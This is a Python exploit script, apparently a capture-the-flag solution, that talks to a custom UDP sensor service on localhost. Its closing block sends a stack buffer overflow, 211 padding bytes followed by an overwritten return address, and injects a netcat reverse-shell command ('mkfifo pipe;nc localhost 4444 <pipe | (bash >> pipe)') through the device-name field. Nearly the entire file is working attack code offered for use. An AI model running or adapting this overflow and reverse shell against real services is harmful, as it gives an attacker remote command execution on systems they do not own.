#!/usr/bin/python3

import socket
import struct

DEBUG=1

DEVREG = 0x00
SENSDATA = 0x01
GETSUM = 0x02

def p8(i: int):
    i &= 0xff
    return struct.pack('<B', i)

def p16(i: int):
    i &= 0xffff
    return struct.pack('<H', i)

def p32(i: int):
    i &= 0xffffffff
    return struct.pack('<i', i)

def p64(i: int):
    i &= 0xffffffffffffffff
    return struct.pack('<Q', i)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('localhost', 34756))

def devreg(sock, name, fields):
    msg = p8(DEVREG) + p16(len(name)) + name + p8(len(fields))

    for field in fields:
        if DEBUG:
            print(f'New dev, field {field}, size {len(field)}')
        msg += p8(len(field)) + field

    if DEBUG:
        print(f'[D] S: {msg}')

    sock.sendall(msg)
    return s.recv(4096)

def sensdata(sock, name, field, value):
    msg = p8(SENSDATA) + p16(len(name)) + name + p8(len(field)) + field + p32(value)

    if DEBUG:
        print(f'[D] S: {msg}')

    sock.sendall(msg)

    return s.recv(4096)

def getsum(sock, name, field):
    msg = p8(GETSUM) + p16(len(name)) + name + p8(len(field)) + field

    if DEBUG:
        print(f'[D] S: {msg}')

    sock.sendall(msg)

    return s.recv(4096)

#s.sendall(b'\x00' + b'\x05\x00' + b'ASDFG' + b'\x02\x00' + b'\x04' + b'zxcv' + b'\x05' + b'qwer')
#print(s.recv(4096))

# backup_all_devices
new_rip = p64(0x555555555481)

devname = b'ASDFGH;mkfifo pipe;nc localhost 4444 <pipe | (bash >> pipe) #'

print(devreg(sock = s, name = devname, fields = (b'zxcv' + b'\x00' + b'\x41'*211 + new_rip, b'qwer')))
print(sensdata(sock = s, name = devname, field = b'zxcv', value = 0))
print(getsum(sock = s, name = devname, field = b'zxcv'))

